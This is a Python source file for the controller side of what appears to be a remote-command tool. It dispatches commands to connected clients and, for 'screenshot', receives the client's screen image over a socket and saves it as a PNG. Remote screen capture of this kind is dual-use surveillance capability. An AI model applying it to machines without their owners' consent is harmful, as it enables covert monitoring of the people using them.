import os
from main import colors
from uuid import uuid4
colors = colors.Colors()
print = colors.print

class Handler:
    def __init__(self):
        self.handler_obj = {
            'error':self.command_error,
            'clear':lambda conn: os.system('clear'),
            'screenshot':self.command_screenshot
        }
    
    def command_error(self, conn=None):
        print('   [-]Command not found','red')
    
    def command_screenshot(self, conn=None):
        '''
        It will send the "screenshot" command,
        the client will return with something like "SIZE 80000",
        and the next bytes will be the image.
        '''
        try:
            conn.send('screenshot'.encode())
            size = int(conn.recv(1024).decode().split(' ')[1])
            new_image_file = open(f'./test/files/server/{uuid4()}.png','wb+')
            while size:
                rbuf = conn.recv(min(size, 4096))
                size -= len(rbuf)
                new_image_file.write(rbuf)
            new_image_file.close()
            
        except Exception as E:
            print('[-]There was an error while transfering the screenshot','red')
            

    

    def main(self, command_name):
        chosen = self.handler_obj.get(command_name) or self.handler_obj['error']
        return chosen